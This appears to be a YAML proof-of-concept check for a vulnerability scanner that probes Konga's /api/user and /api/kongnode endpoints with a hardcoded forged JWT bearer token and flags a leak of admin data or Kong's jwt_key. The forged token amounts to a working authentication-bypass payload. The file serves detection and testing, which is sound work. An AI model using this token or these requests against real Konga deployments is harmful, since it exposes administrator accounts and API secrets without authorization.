name: yaml-poc-pantsel-konga-unauthorized_access-CT-416523
binding: 0e67812c-49d1-48df-94fb-93c27cef9b82
detail:
    author: haiqing.chen
    vulnerability:
        id: 3d6c98dd-4763-4919-b55c-dfa8acb0a1b7
        level: low
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/user
            headers:
                Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("activationToken") && response.body_string.contains("admin") && response.body_string.contains("createdUser")
    r1:
        request:
            cache: true
            method: GET
            path: /api/kongnode
            headers:
                Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("jwt_key") && response.body_string.contains("kong") && response.body_string.contains("createdUser")
expression: r0() || r1()
